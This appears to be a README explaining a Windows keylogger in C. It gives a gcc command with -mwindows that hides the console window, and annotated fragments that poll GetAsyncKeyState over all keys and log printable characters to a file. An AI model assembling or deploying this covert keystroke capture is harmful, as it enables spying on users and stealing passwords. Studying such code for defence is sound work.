# Keylogger Compilation & Explanation

## Compilation
To compile the program without opening a console window, use the following command:

```bash
gcc keylogger.c -o keylogger -mwindows
```

> [!NOTE]
> `fopen` may not create a keylogger.txt when there is none depedning on permissions

## Code Explanation

```c
#define WIN32_LEAN_AND_MEAN
```
The above define excludes APIs such as Cryptography, DDE, RPC, Shell, and Windows Sockets, resulting in faster compilation times and reduced binary size.

---

```c
short GetAsyncKeyState(int vKey);
```
This is a Windows API function that checks the state of a key as of calling and since last call.

---


```c
for (int i = 0; i < 256; i++)
    GetAsyncKeyState(i);
```
This loop ensures that all unwanted key presses are flushed, preventing any unintended logging.

---

```c
if (GetAsyncKeyState(i) & 0b1)
```
This condition checks every ASCII character to determine if it is currently pressed or was pressed since the last check. The bitwise operation `& 0b1` requires the last bit of the return of `GetAsyncKeyState` to be 1, which is the case when the key was specifficaly pressed (not held down).

---

```c
if (i >= 32 && i <= 126)
```
This condition restricts logging to printable ASCII characters.

